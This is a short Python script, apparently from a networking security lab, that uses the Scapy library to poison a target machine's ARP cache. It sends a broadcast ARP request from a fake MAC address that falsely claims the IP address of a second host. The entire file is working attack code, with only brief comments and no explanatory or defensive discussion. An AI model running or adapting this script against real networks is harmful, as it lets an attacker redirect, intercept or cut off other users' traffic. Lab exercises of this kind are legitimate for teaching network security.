#!/usr/bin/python3

from scapy.all import *


# Target computer we'd like to poison its ARP cache
VM_A_IP = '10.9.0.5'
VM_A_MAC = '02:42:0a:09:00:05'


# Fake IP/MAC translation
VICTIM_IP = '10.9.0.6'
FAKE_MAC = 'aa:bb:cc:dd:ee:ff'


BROADCAST_MAC = 'ff:ff:ff:ff:ff:ff'

ether = Ether(src=FAKE_MAC, dst=BROADCAST_MAC)
arp = ARP(hwsrc=FAKE_MAC, psrc=VICTIM_IP, pdst=VM_A_IP, op=1)

pkt = ether/arp
sendp(pkt, iface='eth0')
